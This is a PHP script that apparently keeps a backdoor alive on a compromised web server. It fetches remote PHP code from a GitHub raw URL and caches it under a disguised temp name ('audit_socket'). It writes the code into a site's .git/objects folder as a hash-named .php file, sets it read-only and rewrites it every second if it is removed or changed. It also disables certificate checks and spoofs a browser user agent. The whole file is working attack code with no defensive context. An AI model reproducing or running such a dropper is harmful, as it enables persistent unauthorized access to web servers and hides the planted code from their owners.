<?php

set_time_limit(0);

$files = [
    [
        'path' => 'D:/vhost/default/juAlumni/.git/objects/f7/995a3407c8fd9923f6d0c6fb8c8bce8ed4c91d.php',
        'url' => 'https://raw.githubusercontent.com/jazzplunker97/trash/refs/heads/main/horizon.php',
        'chmod' => 0444
    ],
];

function curl_data($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
        $data = curl_exec($ch);
        curl_close($ch);
    } else {
        $options = array(
            'ssl' => array(
                'verify_peer' => false,
                'verify_peer_name' => false,
            ),
            'http' => array(
                'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
            )
        );
        $context = stream_context_create($options);
        $data = file_get_contents($url, false, $context);
    }
    return $data;
}

$tempDir = sys_get_temp_dir();
$stopFile = $tempDir . '/stop';
$notifFile = $tempDir . '/finish';

foreach ($files as $key => $value) {
    $tempFile = $tempDir . "/audit_socket_{$key}.sock";

    $files[$key]['tmp_file'] = $tempFile;

    if (!file_exists($tempFile)) {
        $fileContent = curl_data($files[$key]['url']);
        file_put_contents($tempFile, $fileContent);
    }
}

while (true && !file_exists($stopFile)) {
    foreach ($files as $key => $value) {
        $filePath = $files[$key]['path'];
        $tmpFilePath = $files[$key]['tmp_file'];
        $dirPath = dirname($filePath);

        if (!is_dir($dirPath)) {
            mkdir($dirPath, 0755, true);
        }

        if (!file_exists($filePath) || hash_file('md5', $tmpFilePath) != hash_file('md5', $filePath)) {
            $handle = fopen($filePath, 'w');
            if ($handle) {
                fwrite($handle, file_get_contents($tmpFilePath));
                fclose($handle);

                chmod($filePath, $files[$key]['chmod']);
            }
        }
    }
    sleep(1);
}

file_put_contents($notifFile, 'finish');